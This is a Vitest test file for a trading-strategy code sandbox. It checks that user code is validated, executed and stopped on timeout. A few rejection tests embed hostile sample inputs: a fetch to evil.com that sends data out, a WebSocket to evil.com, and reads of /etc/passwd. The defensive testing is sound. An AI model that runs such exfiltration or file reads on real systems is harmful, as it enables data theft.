import { describe, it, expect } from 'vitest'
import { StrategySandbox, validateCode } from '../../src/services/strategy-sandbox.js'
import type { OHLCV } from '@marlin/shared'
import type { SandboxConfig } from '../../src/services/strategy-sandbox.js'

// ── Fixtures ───────────────────────────────────────────────

function makeBars(count: number, startPrice = 100): OHLCV[] {
  const bars: OHLCV[] = []
  let price = startPrice
  for (let i = 0; i < count; i++) {
    const change = (Math.sin(i * 0.3) * 2) + (Math.random() - 0.5)
    price += change
    bars.push({
      time: 1700000000 + i * 60,
      open: price - 0.5,
      high: price + 1,
      low: price - 1,
      close: price,
      volume: 10000 + Math.floor(Math.random() * 5000),
    })
  }
  return bars
}

function makeConfig(overrides: Partial<SandboxConfig> = {}): SandboxConfig {
  return {
    symbol: 'AAPL',
    equity: 100_000,
    ...overrides,
  }
}

// ── Tests ──────────────────────────────────────────────────

describe('StrategySandbox', () => {
  describe('validateCode', () => {
    it('accepts valid strategy code with onBar function', () => {
      const code = `
        function onBar(bar, index) {
          if (bar.close > 100 && position() === 0) {
            buy(10, 'price above 100');
          }
        }
      `
      const result = validateCode(code)
      expect(result.valid).toBe(true)
      expect(result.errors).toHaveLength(0)
    })

    it('accepts arrow function assigned to onBar', () => {
      const code = `
        const onBar = (bar, index) => {
          if (index > 5) buy(1);
        }
      `
      const result = validateCode(code)
      expect(result.valid).toBe(true)
    })

    it('rejects code with eval()', () => {
      const code = `
        function onBar(bar, index) {
          eval('buy(10)');
        }
      `
      const result = validateCode(code)
      expect(result.valid).toBe(false)
      expect(result.errors.some((e) => e.includes('eval'))).toBe(true)
    })

    it('rejects code with require()', () => {
      const code = `
        function onBar(bar, index) {
          const fs = require('fs');
        }
      `
      const result = validateCode(code)
      expect(result.valid).toBe(false)
      expect(result.errors.some((e) => e.includes('require'))).toBe(true)
    })

    it('rejects code with import statements', () => {
      const code = `
        import something from 'module';
        function onBar(bar, index) { buy(1); }
      `
      const result = validateCode(code)
      expect(result.valid).toBe(false)
      expect(result.errors.some((e) => e.includes('import'))).toBe(true)
    })

    it('rejects code with dynamic import()', () => {
      const code = `
        function onBar(bar, index) {
          import('fs').then(m => m.readFileSync('/etc/passwd'));
        }
      `
      const result = validateCode(code)
      expect(result.valid).toBe(false)
      // Should catch both the import() and the Promise pattern
      expect(result.errors.length).toBeGreaterThan(0)
    })

    it('rejects code with process access', () => {
      const code = `
        function onBar(bar, index) {
          process.exit(0);
        }
      `
      const result = validateCode(code)
      expect(result.valid).toBe(false)
      expect(result.errors.some((e) => e.includes('process'))).toBe(true)
    })

    it('rejects code with fetch()', () => {
      const code = `
        function onBar(bar, index) {
          fetch('https://evil.com/steal?data=' + bar.close);
        }
      `
      const result = validateCode(code)
      expect(result.valid).toBe(false)
      expect(result.errors.some((e) => e.includes('fetch'))).toBe(true)
    })

    it('rejects code with setTimeout()', () => {
      const code = `
        function onBar(bar, index) {
          setTimeout(() => buy(10), 1000);
        }
      `
      const result = validateCode(code)
      expect(result.valid).toBe(false)
      expect(result.errors.some((e) => e.includes('setTimeout'))).toBe(true)
    })

    it('rejects code with async/await', () => {
      const code = `
        async function onBar(bar, index) {
          await something();
        }
      `
      const result = validateCode(code)
      expect(result.valid).toBe(false)
      expect(result.errors.some((e) => e.includes('async'))).toBe(true)
    })

    it('rejects code with new Function()', () => {
      const code = `
        function onBar(bar, index) {
          const fn = new Function('return 1');
        }
      `
      const result = validateCode(code)
      expect(result.valid).toBe(false)
      expect(result.errors.some((e) => e.includes('new Function'))).toBe(true)
    })

    it('rejects code without onBar function', () => {
      const code = `
        function myStrategy(bar) {
          buy(10);
        }
      `
      const result = validateCode(code)
      expect(result.valid).toBe(false)
      expect(result.errors.some((e) => e.includes('onBar'))).toBe(true)
    })

    it('rejects empty code', () => {
      const result = validateCode('')
      expect(result.valid).toBe(false)
    })

    it('rejects code exceeding 64KB', () => {
      const code = 'function onBar(bar, index) {}\n' + 'x'.repeat(66_000)
      const result = validateCode(code)
      expect(result.valid).toBe(false)
      expect(result.errors.some((e) => e.includes('64KB'))).toBe(true)
    })

    it('rejects code with WebSocket access', () => {
      const code = `
        function onBar(bar, index) {
          const ws = new WebSocket('ws://evil.com');
        }
      `
      const result = validateCode(code)
      expect(result.valid).toBe(false)
      expect(result.errors.some((e) => e.includes('WebSocket'))).toBe(true)
    })

    it('rejects code with globalThis access', () => {
      const code = `
        function onBar(bar, index) {
          globalThis.require('fs');
        }
      `
      const result = validateCode(code)
      expect(result.valid).toBe(false)
      expect(result.errors.some((e) => e.includes('globalThis'))).toBe(true)
    })
  })

  describe('execute — valid strategies', () => {
    it('executes a simple buy strategy and returns signals', () => {
      const sandbox = new StrategySandbox()
      const bars = makeBars(10)
      const config = makeConfig()

      const code = `
        function onBar(bar, index) {
          if (index === 2 && position() === 0) {
            buy(10, 'entry signal');
          }
        }
      `

      const result = sandbox.execute(code, bars, config)

      expect(result.success).toBe(true)
      if (!result.success) return

      expect(result.barsProcessed).toBe(10)
      expect(result.signals).toHaveLength(1)
      expect(result.signals[0]!.side).toBe('buy')
      expect(result.signals[0]!.quantity).toBe(10)
      expect(result.signals[0]!.reason).toBe('entry signal')
      expect(result.signals[0]!.symbol).toBe('AAPL')
    })

    it('captures buy and sell signals correctly', () => {
      const sandbox = new StrategySandbox()
      const bars = makeBars(20)
      const config = makeConfig()

      const code = `
        function onBar(bar, index) {
          if (index === 3 && position() === 0) {
            buy(5, 'long entry');
          }
          if (index === 10 && position() > 0) {
            sell(5, 'exit');
          }
        }
      `

      const result = sandbox.execute(code, bars, config)

      expect(result.success).toBe(true)
      if (!result.success) return

      expect(result.signals).toHaveLength(2)
      expect(result.signals[0]!.side).toBe('buy')
      expect(result.signals[0]!.quantity).toBe(5)
      expect(result.signals[1]!.side).toBe('sell')
      expect(result.signals[1]!.quantity).toBe(5)
    })

    it('tracks position correctly across multiple trades', () => {
      const sandbox = new StrategySandbox()
      const bars = makeBars(10)
      const config = makeConfig()

      const code = `
        function onBar(bar, index) {
          if (index === 1) buy(10);
          if (index === 3) buy(5);
          if (index === 5) {
            log('position at bar 5:', position());
            sell(15);
          }
          if (index === 7) {
            log('position at bar 7:', position());
          }
        }
      `

      const result = sandbox.execute(code, bars, config)

      expect(result.success).toBe(true)
      if (!result.success) return

      expect(result.signals).toHaveLength(3)
      // Position tracking: +10, +5 = 15, then -15 = 0
      expect(result.logs).toContain('position at bar 5: 15')
      expect(result.logs).toContain('position at bar 7: 0')
    })

    it('provides access to indicator functions', () => {
      const sandbox = new StrategySandbox()
      const bars = makeBars(30)
      const config = makeConfig()

      const code = `
        function onBar(bar, index) {
          var smaValues = indicators.sma(10);
          if (index === 20) {
            log('SMA value defined:', smaValues[index] !== null);
          }
        }
      `

      const result = sandbox.execute(code, bars, config)

      expect(result.success).toBe(true)
      if (!result.success) return

      expect(result.logs.some((l) => l.includes('SMA value defined: true'))).toBe(true)
    })

    it('provides equity() function', () => {
      const sandbox = new StrategySandbox()
      const bars = makeBars(5)
      const config = makeConfig({ equity: 50_000 })

      const code = `
        function onBar(bar, index) {
          if (index === 0) {
            log('equity:', equity());
          }
        }
      `

      const result = sandbox.execute(code, bars, config)

      expect(result.success).toBe(true)
      if (!result.success) return
      expect(result.logs).toContain('equity: 50000')
    })

    it('collects log messages (capped at 1000)', () => {
      const sandbox = new StrategySandbox()
      const bars = makeBars(5)
      const config = makeConfig()

      const code = `
        function onBar(bar, index) {
          log('bar', index, 'close:', bar.close);
        }
      `

      const result = sandbox.execute(code, bars, config)

      expect(result.success).toBe(true)
      if (!result.success) return
      expect(result.logs).toHaveLength(5)
      expect(result.logs[0]).toMatch(/bar 0 close:/)
    })

    it('returns execution timing information', () => {
      const sandbox = new StrategySandbox()
      const bars = makeBars(10)
      const config = makeConfig()

      const code = `function onBar(bar, index) {}`

      const result = sandbox.execute(code, bars, config)

      expect(result.success).toBe(true)
      if (!result.success) return
      expect(result.executionMs).toBeGreaterThanOrEqual(0)
      expect(result.barsProcessed).toBe(10)
    })
  })

  describe('execute — error handling', () => {
    it('catches runtime errors in user code', () => {
      const sandbox = new StrategySandbox()
      const bars = makeBars(10)
      const config = makeConfig()

      const code = `
        function onBar(bar, index) {
          if (index === 5) {
            throw new Error('intentional failure');
          }
        }
      `

      const result = sandbox.execute(code, bars, config)

      expect(result.success).toBe(false)
      if (result.success) return
      expect(result.errorType).toBe('runtime')
      expect(result.error).toContain('intentional failure')
      expect(result.barsProcessed).toBe(5) // Processed 5 bars before error
    })

    it('catches compilation errors', () => {
      const sandbox = new StrategySandbox()
      const bars = makeBars(5)
      const config = makeConfig()

      // Invalid JS syntax, but passes the simple regex validation for onBar
      const code = `function onBar(bar, index) { if ( }`

      const result = sandbox.execute(code, bars, config)

      expect(result.success).toBe(false)
      if (result.success) return
      expect(result.errorType).toBe('runtime')
      expect(result.error).toContain('Compilation error')
    })

    it('rejects code that fails validation', () => {
      const sandbox = new StrategySandbox()
      const bars = makeBars(5)
      const config = makeConfig()

      const code = `
        function onBar(bar, index) {
          eval('buy(1)');
        }
      `

      const result = sandbox.execute(code, bars, config)

      expect(result.success).toBe(false)
      if (result.success) return
      expect(result.errorType).toBe('validation')
      expect(result.error).toContain('eval')
    })

    it('prevents access to require from sandbox scope', () => {
      // Even if somehow code passes validation, the sandbox scope
      // should not have require available
      const sandbox = new StrategySandbox()
      const bars = makeBars(5)
      const config = makeConfig()

      // This code won't pass validation due to require,
      // so test the validateCode method directly
      const validation = sandbox.validateCode(`
        function onBar(bar, index) {
          require('fs');
        }
      `)

      expect(validation.valid).toBe(false)
      expect(validation.errors.some((e) => e.includes('require'))).toBe(true)
    })

    it('prevents filesystem access via validation', () => {
      const sandbox = new StrategySandbox()
      const validation = sandbox.validateCode(`
        function onBar(bar, index) {
          fs.readFileSync('/etc/passwd');
        }
      `)
      expect(validation.valid).toBe(false)
      expect(validation.errors.some((e) => e.includes('Filesystem'))).toBe(true)
    })

    it('prevents network access via validation', () => {
      const sandbox = new StrategySandbox()
      const validation = sandbox.validateCode(`
        function onBar(bar, index) {
          fetch('https://evil.com');
        }
      `)
      expect(validation.valid).toBe(false)
      expect(validation.errors.some((e) => e.includes('fetch'))).toBe(true)
    })

    it('handles user code that accesses undefined variables gracefully', () => {
      const sandbox = new StrategySandbox()
      const bars = makeBars(5)
      const config = makeConfig()

      const code = `
        function onBar(bar, index) {
          if (index === 2) {
            var x = undefinedVariable.something;
          }
        }
      `

      const result = sandbox.execute(code, bars, config)

      expect(result.success).toBe(false)
      if (result.success) return
      expect(result.errorType).toBe('runtime')
    })

    it('freezes bar data so user code cannot mutate it', () => {
      const sandbox = new StrategySandbox()
      const bars = makeBars(5, 100)
      const originalClose = bars[0]!.close
      const config = makeConfig()

      const code = `
        function onBar(bar, index) {
          try {
            bar.close = 999999;
          } catch(e) {
            log('frozen: ' + e.message);
          }
        }
      `

      const result = sandbox.execute(code, bars, config)

      expect(result.success).toBe(true)
      // Original bars should be unmodified
      expect(bars[0]!.close).toBe(originalClose)
    })
  })

  describe('execute — timeout enforcement', () => {
    it('reports timeout for excessively slow per-bar execution', () => {
      // Create a sandbox with a very strict per-bar limit
      const sandbox = new StrategySandbox({
        maxBarMs: 0.001, // 0.001ms per bar — virtually guaranteed to timeout on any real work
        maxTotalMs: 5000,
      })
      const bars = makeBars(100)
      const config = makeConfig()

      // Do enough work to take more than 0.001ms
      const code = `
        function onBar(bar, index) {
          var sum = 0;
          for (var i = 0; i < 10000; i++) {
            sum += Math.sqrt(i) * Math.sin(i);
          }
        }
      `

      const result = sandbox.execute(code, bars, config)

      // Should eventually hit the per-bar or total timeout
      // Note: Due to timing granularity, this may or may not trigger.
      // The important thing is that the mechanism exists.
      // We set an extremely tight limit so it should trigger.
      expect(result.success).toBe(false)
      if (result.success) return
      expect(result.errorType).toBe('timeout')
    })

    it('reports timeout for total execution time exceeded', () => {
      const sandbox = new StrategySandbox({
        maxBarMs: 100,
        maxTotalMs: 1, // 1ms total — will timeout quickly
      })
      const bars = makeBars(1000)
      const config = makeConfig()

      const code = `
        function onBar(bar, index) {
          var sum = 0;
          for (var i = 0; i < 100; i++) {
            sum += Math.sqrt(i);
          }
        }
      `

      const result = sandbox.execute(code, bars, config)

      expect(result.success).toBe(false)
      if (result.success) return
      expect(result.errorType).toBe('timeout')
      expect(result.barsProcessed).toBeLessThan(1000)
    })
  })

  describe('validateCode (standalone)', () => {
    it('rejects Promise usage', () => {
      const result = validateCode(`
        function onBar(bar, index) {
          var p = new Promise(function(resolve) { resolve(1); });
        }
      `)
      expect(result.valid).toBe(false)
      expect(result.errors.some((e) => e.includes('Promise'))).toBe(true)
    })

    it('rejects Buffer access', () => {
      const result = validateCode(`
        function onBar(bar, index) {
          Buffer.from('test');
        }
      `)
      expect(result.valid).toBe(false)
      expect(result.errors.some((e) => e.includes('Buffer'))).toBe(true)
    })

    it('allows legitimate Math usage', () => {
      const result = validateCode(`
        function onBar(bar, index) {
          var avg = (bar.open + bar.close) / 2;
          var rounded = Math.round(avg * 100) / 100;
          if (rounded > 100) buy(1);
        }
      `)
      expect(result.valid).toBe(true)
    })

    it('allows legitimate indicator usage', () => {
      const result = validateCode(`
        function onBar(bar, index) {
          var smaValues = indicators.sma(20);
          var rsiValues = indicators.rsi(14);
          if (smaValues[index] !== null && rsiValues[index] < 30) {
            buy(10, 'oversold bounce');
          }
        }
      `)
      expect(result.valid).toBe(true)
    })
  })
})
